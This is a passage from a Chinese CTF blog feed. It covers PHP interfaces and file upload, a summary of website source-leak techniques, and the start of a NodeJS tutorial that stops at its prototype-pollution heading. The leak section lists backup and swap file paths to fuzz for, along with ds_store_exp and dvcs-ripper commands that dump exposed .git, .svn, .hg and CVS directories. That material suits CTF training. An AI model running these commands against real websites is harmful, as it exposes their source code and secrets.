function">json_decode</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$arr1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$arr2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20210603203006.png" loading="lazy"></p><h1 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h1><p>使用关键字abstract来声明一个抽象类以及抽象方法。抽象类不能实例化对象，子类继承抽象父类后，子类中必须有父类中的抽象方法。抽象类起到规定子类结构的作用，子类必须给出父类抽象方法的实现。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210603203616.png" loading="lazy"><br>在子类中必须重写父类的抽象方法，否则会报错。</p><h1 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h1><p>接口是一种特殊的抽象类，使用关键字interface来声明一个接口，不能实例化对象。接口中的方法必须全是抽象方法成员属性必须是常量。所有的权限必须是public，由子类来拓展。使用implements代替extends来实现接口，一个类只能继承一个父类，但是可实现多个接口。如果一个类同时使用了继承父类和实现接口，必须先继承再实现。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">interface</span> <span class="token class-name">example</span><span class="token punctuation">&#123;</span>      <span class="token keyword">const</span> <span class="token constant">NAME</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"lisi"</span><span class="token punctuation">;</span>      <span class="token keyword">const</span> <span class="token constant">AGE</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"120"</span><span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">interface</span> <span class="token class-name">example2</span> <span class="token keyword">extends</span> <span class="token class-name">example</span><span class="token punctuation">&#123;</span>      <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">worker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name">Person</span><span class="token punctuation">&#123;</span>      <span class="token keyword">function</span> <span class="token function">child</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"hhhhhhhhh~~~~"</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">interface</span> <span class="token class-name">example3</span><span class="token punctuation">&#123;</span>      <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">teacher</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name">child</span> <span class="token keyword">extends</span> <span class="token class-name">Person</span> <span class="token keyword">implements</span> <span class="token class-name">example</span><span class="token punctuation">,</span>example3<span class="token punctuation">&#123;</span>      <span class="token keyword">function</span> <span class="token function">student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"hello,student.&lt;br>"</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">function</span> <span class="token function">teacher</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"hello,teacher.&lt;br>"</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$zhangsan</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">child</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$zhangsan</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$zhangsan</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">teacher</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20210603204713.png" loading="lazy"></p><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><pre class="language-php" data-language="php"><code class="language-php">#upload.hmtl<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>文件上传<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>my_uploadfile<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>#index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20210603205210.png" loading="lazy"><br><img src="https://gitee.com/m0re/picture/raw/master/img/20210603205311.png" loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些关于信息泄露的知识点</title>
      <link href="/posts/875fe7b5/"/>
      <url>/posts/875fe7b5/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/m0re/picture/raw/master/img/38.jpg" loading="lazy"><br>最近有点颓废，博客好久没更新了，以后要加倍努力了。</p><a id="more"></a><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>CTF中的信息泄露题目，常见的还有不常见的，这里做下总结。<br>因为比赛因为去查各种文章，容易在见识少这儿吃亏。</p><h3 id="网站备份文件源码泄露"><a href="#网站备份文件源码泄露" class="headerlink" title="网站备份文件源码泄露"></a>网站备份文件源码泄露</h3><p>首先是这个，可以跑字典。一个好的字典特别重要，这里我列举一下常用的，然后找了一些字典。<a href="https://gitee.com/zzgiteezz/Fuzzing-Dicts">https://gitee.com/zzgiteezz/Fuzzing-Dicts</a><br>然后记录一下常见的</p><pre class="language-bash" data-language="bash"><code class="language-bash">/www.zip<span class="token operator">|</span><span class="token function">rar</span><span class="token operator">|</span>7z<span class="token operator">|</span>tar.gz<span class="token operator">|</span>gz/index.php~<span class="token operator">|</span>php.bak</code></pre><p>不再列举更多，字典中都有。</p><h3 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h3><p>vim缓存是个很大的问题，当你在非正常关闭vim编辑器时，（直接关闭终端或者电脑断电关机等现象），会生成一个 <code>.swp</code>文件，这个文件是一个临时交换文件，用来备份缓冲区内容。<br>第一次生成的交换文件名为<code>.swp</code>，再次意外退出后，会生成后缀名为<code>.swo</code>的文件，第三次生成的交换文件名为<code>.swn</code>。</p><ul><li>还有phps后缀文件泄露，ctfshow有题目，可做。</li><li>可以直接使用curl命令查看网页信息<h3 id="git泄露-amp-HG泄露"><a href="#git泄露-amp-HG泄露" class="headerlink" title="git泄露&amp;HG泄露"></a>git泄露&amp;HG泄露</h3>git泄露之前又介绍过，可以查看此篇文章。<a href="https://blog.csdn.net/qq_45836474/article/details/107767955">https://blog.csdn.net/qq_45836474/article/details/107767955</a><br>只说一点hg泄露<br>一般数据在/.hg/store/data/中<br>但是，这里的data文件夹中没有发现内容，所以看到了这个undo.dirstate文件中看到了flag有关内容<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210516170138.png" loading="lazy"><br>这里可以直接浏览器访问得到flag<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210516170843.png" loading="lazy"><br>不再赘述。<h3 id="DS-Store文件泄漏"><a href="#DS-Store文件泄漏" class="headerlink" title=".DS_Store文件泄漏"></a>.DS_Store文件泄漏</h3>利用工具：<a href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a><br>使用方法：<pre class="language-bash" data-language="bash"><code class="language-bash">python2 ds_store_exp.py http://www.xxxx.com/website/face2face/01/pages/.DS_Store</code></pre>注意版本是python2.x<br>没有实战题目，就介绍到这里。<h3 id="svn泄露-amp-bzr"><a href="#svn泄露-amp-bzr" class="headerlink" title=".svn泄露&amp;bzr"></a>.svn泄露&amp;bzr</h3>工具：<br>GitHub项目：<a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a><br>这个工具比较强了就，先安装依赖<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl<span class="token function">apt-get</span> <span class="token function">install</span> libparallel-forkmanager-perl libredis-perl libalgorithm-combinatorics-perl<span class="token function">apt-get</span> <span class="token function">install</span> cvs subversion <span class="token function">git</span> bzr mercurial</code></pre>解决git泄露<pre class="language-bash" data-language="bash"><code class="language-bash">rip-git.pl -v -u http://www.example.com/.git/</code></pre>解决hg泄露<pre class="language-bash" data-language="bash"><code class="language-bash">rip-hg.pl -v -u http://www.example.com/.hg/</code></pre>解决bzr泄露<pre class="language-bash" data-language="bash"><code class="language-bash">rip-bzr.pl -v -u http://www.example.com/.bzr/</code></pre>解决SVN泄露<pre class="language-bash" data-language="bash"><code class="language-bash">rip-svn.pl -v -u http://www.example.com/.svn/</code></pre>解决CVS泄露<pre class="language-bash" data-language="bash"><code class="language-bash">rip-cvs.pl -v -u http://www.example.com/CVS/</code></pre>seay-svn工具，GUI方便操作。注意：火绒报毒，在虚拟机中使用。这个工具仅适用于 SVN 版本小于 1.7<br>题目：CTFhub技能树<pre class="language-bash" data-language="bash"><code class="language-bash">./rip-svn.pl -v -u http://challenge-7cf5ea263fdb6f16.sandbox.ctfhub.com:10080/.svn/</code></pre>然后复原一个<code>index.html</code>，它是没有有用信息的。这里在当前目录下生成了<code>.svn/</code>文件夹，由于隐藏的需要使用<code>ls -a</code>来查看。使用tree命令来列出该目录的大致架构<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210516161052.png" loading="lazy"><br>在pristine目录下又两个信息文件夹，所以此刻就可以直接查看了每个文件内容，得到flag<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210516161243.png" loading="lazy"></li></ul><p>然后就是一个工具：svnExploit（GitHub项目）它适应所有的svn版本。<br>使用方法在redeme.md中写的很详细。</p><h3 id="Git-SVN泄露查询工具"><a href="#Git-SVN泄露查询工具" class="headerlink" title="Git/SVN泄露查询工具"></a>Git/SVN泄露查询工具</h3><p>Test404 HTTP Fuzzer v4.1.1<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210516203724.png" loading="lazy"></p><h3 id="CVS文件泄漏"><a href="#CVS文件泄漏" class="headerlink" title="CVS文件泄漏"></a>CVS文件泄漏</h3><p><a href="http://www.example.com/CVS/Root">http://www.example.com/CVS/Root</a> 返回根信息<br><a href="http://www.example.com/CVS/Entries">http://www.example.com/CVS/Entries</a> 返回所有文件的结构<br>bk clone <a href="http://www.example.com/test">http://www.example.com/test</a> dir 把远端一个名为test的repo clone到本地名为dir的目录下.<br>bk changes 查看所有的改变的命令，转到download的目录</p><h3 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF/web.xml泄露"></a>WEB-INF/web.xml泄露</h3><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。<br>WEB-INF主要包含一下文件或目录：<br><code>/WEB-INF/web.xml</code>：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。<br><code>/WEB-INF/classes/</code>：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中<br><code>/WEB-INF/lib/</code>：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br><code>/WEB-INF/src/</code>：源码目录，按照包名结构放置各个java文件。<br><code>/WEB-INF/database.properties</code>：数据库配置文件</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>做个总结，有些没有找到相应题目，只能贴下理论知识。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NodeJS从零开始到原型链污染</title>
      <link href="/posts/63e48fc9/"/>
      <url>/posts/63e48fc9/</url>
      
        <content type="html"><![CDATA[<p><img src="https://p4.ssl.qhimg.com/t011089ec50e5a93be5.jpg" alt="m0re" loading="lazy"><br>本文首发安全客原创发布<br>原文地址——<a href="https://www.anquanke.com/post/id/236182">NodeJS从零开始到原型链污染</a></p><a id="more"></a><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>因为近段时间包括去年，在打CTF的时候确实有遇到NodeJS的题目，但是从来没系统学习，所以拿到题很懵。不知道应该从什么地方入手，所以决定去学习一下，但是之前没怎么学过JavaScript，语法之类的更是不懂，所以在此之前，花了三五天的时间，一边做题一边恶补了JavaScript的基础。<br>才开始写这篇文章。</p><h2 id="NodeJS基础"><a href="#NodeJS基础" class="headerlink" title="NodeJS基础"></a>NodeJS基础</h2><p>简单介绍（<del>多一句嘴，确实是从零基础开始的</del>）：</p><blockquote><p>Node.js 是一个基于 Chrome V8 引擎的 Javascript 运行环境</p></blockquote><p>但是它是由C++开发的，它只是一个JavaScript语言解释器。<br>REPL环境运行JavaScript的代码<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210326225844.png" loading="lazy"><br>在浏览器的控制台或者node的运行环境都属于REPL运行环境，均可以运行JS代码。<br>在NodeJS中分为三个模块，分别是：核心模块、自定义模块、第三方模块。<br>这里提一点，JS代码在编程时，如果需要使用某个模块的功能，那么就需要提前将其导入，与Python类似，只不过在Python中使用import关键字，而JS中使用require关键字。</p><h4 id="读取文件操作"><a href="#读取文件操作" class="headerlink" title="读取文件操作"></a>读取文件操作</h4><p>文件系统模块就是核心模块<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210326230306.png" loading="lazy"></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//导入fs模块</span>fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span><span class="token string">'./haha.txt'</span><span class="token punctuation">,</span><span class="token string">'utf8'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span>data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'---分界线----'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"wuhu"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>读取文件的操作，在下面CTF例题中会用到。读取文件的各种姿势。<br>在<a href="http://nodejs.cn/api/fs.html">这里</a>了解更多读取文件的函数和使用。</p><h4 id="同步和异步"><a href="#同步和异步" class="headerlink" title="同步和异步"></a>同步和异步</h4><p>区别：</p><blockquote><p>同步方法： 等待每个操作完成，然后只执行下一个操作<br>  异步方式： 从不等待每个操作完成，而是只在第一步执行所有操作</p></blockquote><p>看到一个比较有趣的描述：</p><blockquote><p>同步： 可以拿吃饭和看电视来举例子，同步就是先吃完饭，吃完饭后再看电视，不能边看边吃，这就是同步<br>异步： 同样拿上边的例子来说，异步就是边吃饭边看电视，看电视和吃饭同时进行，这样举例就应该很清楚了</p></blockquote><p>还用上面的代码做例子，readFile()是异步操作，所以其运行结果为<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210326234701.png" loading="lazy"><br>同步例子：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//导入fs模块</span>a <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./haha.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"wuhu"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20210326235038.png" loading="lazy"><br>可以很明显的看出来下面阻塞代码程序是正常的同步加载，代码由上到下执行。上面这个异步（非阻塞）代码程序会先输出下面的console.log()然后才执行回掉函数里的代码。</p><h4 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h4><ol><li>__dirname：当前模块的目录名。</li><li>__filename：当前模块的文件名。 这是当前的模块文件的绝对路径（符号链接会被解析）。</li><li>exports变量是默认赋值给<code>module.exports</code>，它可以被赋予新值，它会暂时不会绑定到module.exports。</li><li>module：在每个模块中， <code>module</code> 的自由变量是对表示当前模块的对象的引用。 为方便起见，还可以通过全局模块的 <code>exports</code> 访问 <code>module.exports</code>。 module 实际上不是全局的，而是每个模块本地的</li><li>require模块就不多说了，用于引入模块、 JSON、或本地文件。 可以从 node_modules 引入模块。<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 引入 JSON 文件：</span><span class="token keyword">const</span> jsonData <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./path/filename.json'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 引入 node_modules 模块或 Node.js 内置模块：</span><span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li></ol><p>自己设置全局变量</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">global<span class="token punctuation">.</span>something <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span> </code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20210327002650.png" loading="lazy"><br>经常使用的全局变量是<code>__dirname</code>、<code>__filename</code></p><h4 id="HTTP服务"><a href="#HTTP服务" class="headerlink" title="HTTP服务"></a>HTTP服务</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"> <span class="token comment">//引入http核心模块</span><span class="token keyword">var</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建一个服务</span><span class="token keyword">var</span> server <span class="token operator">=</span> http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//绑定连接</span>server<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'request'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">res<span class="token punctuation">,</span>rs</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>method<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//打印请求的方法</span>    rs<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'hello,world!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//返回数据</span>    rs<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//断开连接</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">//启动监听</span>server<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">4444</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'请访问127.0.0.1:4444'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>启动运行该文件，访问指定端口，HTTP服务的网页就显示出来了。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210327003513.png" loading="lazy"></p><h4 id="child-process-创建子进程"><a href="#child-process-创建子进程" class="headerlink" title="child_process(创建子进程)"></a>child_process(创建子进程)</h4><p>child_process提供了几种创建子进程的方式</p><blockquote><p>异步方式：spawn、exec、execFile、fork<br>同步方式：spawnSync、execSync、execFileSync</p></blockquote><p>经过上面的同步和异步思想的理解，创建子进程的同步异步方式应该不难理解。<br>在异步创建进程时，spawn是基础，其他的fork、exec、execFile都是基于spawn来生成的。<br>同步创建进程可以使用<code>child_process.spawnSync()</code>、<code>child_process.execSync()</code> 和 <code>child_process.execFileSync()</code> ，同步的方法会阻塞 Node.js 事件循环、暂停任何其他代码的执行，直到子进程退出。</p><h2 id="JavaScript原型链"><a href="#JavaScript原型链" class="headerlink" title="JavaScript原型链"></a>JavaScript原型链</h2><h3 id="原型和原型链"><a href="#原型和原型链" class="headerlink" title="原型和原型链"></a>原型和原型链</h3><p>首先要知道，JavaScript没有父类和子类这个概念，也没有类和实例的区分，而JavaScript中的继承关系则是靠一种很奇怪的“原型链”模式来实现继承。<br>在次之前，要先搞清楚对象和函数有什么区别和联系。</p><blockquote><p>对象是由函数创建的，而函数又是另一种对象。</p></blockquote><h4 id="JavaScript中的对象"><a href="#JavaScript中的对象" class="headerlink" title="JavaScript中的对象"></a>JavaScript中的对象</h4><p>在JavaScript中几乎所有的事物都是对象，如下代码：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token operator">:</span> <span class="token string">"m0re"</span><span class="token punctuation">,</span><span class="token string">"blog"</span><span class="token operator">:</span> <span class="token string">"https://m0re.top"</span><span class="token punctuation">&#125;</span>a<span class="token punctuation">.</span>name<span class="token punctuation">;</span>a<span class="token punctuation">.</span>blog<span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>其中访问对像的属性，可以有两种方式：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//例如</span>a<span class="token punctuation">.</span>name<span class="token punctuation">;</span>a<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><h4 id="原型的定义和继承"><a href="#原型的定义和继承" class="headerlink" title="原型的定义和继承"></a>原型的定义和继承</h4><p>原型的定义：</p><blockquote><p>任何对象都有一个原型对象，这个原型对象由对象的内置属性proto指向它的构造函数的prototype指向的对象，即任何对象都是由一个构造函数创建的</p></blockquote><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span>age</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>a函数内容是a类的构造函数，其中<code>this.name</code>、<code>this.age</code>就是a类的属性。</p><p>在JavaScript中，声明了一个函数a，然后浏览器就自动在内存中创建一个对象b，a函数默认有一个属性<code>prototype</code>指向了这个对象b，b就是函数a的原型对象，简称原型。同时，对象b默认有属性constructor指向函数a。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210328091708.png" loading="lazy"></p><p>创建一个对象a，对象a会默认有一个属性__proto__指向构造函数A的原型对象b<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210328092546.png" loading="lazy"><br>这里<code>A.prototype</code>就指向函数的原型B。则<code>a.__proto__</code>是实例化的对象a的一个属性。<br>在javascript中，一切都是对象，他也只有对象这一种结构。而对象和对象间又存在继承关系。</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> test <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    a<span class="token operator">:</span><span class="token number">1</span> <span class="token punctuation">,</span>    <span class="token function-variable function">b</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">var</span> c <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//c继承test</span> c<span class="token punctuation">.</span>a<span class="token operator">=</span><span class="token number">888</span><span class="token punctuation">;</span><span class="token comment">//继承test的变量</span>c<span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//继承test的函数</span></code></pre><blockquote><p>每个实例对象(object)都有一个私有属性(<strong>proto</strong>)指向它的构造函数的原型对象(prototype)，每个实例对象还有一个属性(constructor)指向原型的构造函数。该原型对象也有一个自己的原型对象(<strong>proto</strong>)，层层向上直到一个对象的原型对象为null。根据定义，null 没有原型，并作为这个原型链中的最后一个环节。</p></blockquote><p>经过不断调用，最终的原型对象会调用到null，这将作为该原型链的最后一个环节，与之对应的，作为终点的 null 自然也是没有原型对象的。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210328093554.png" loading="lazy"></p><h4 id="原型链定义及如何污染"><a href="#原型链定义及如何污染" class="headerlink" 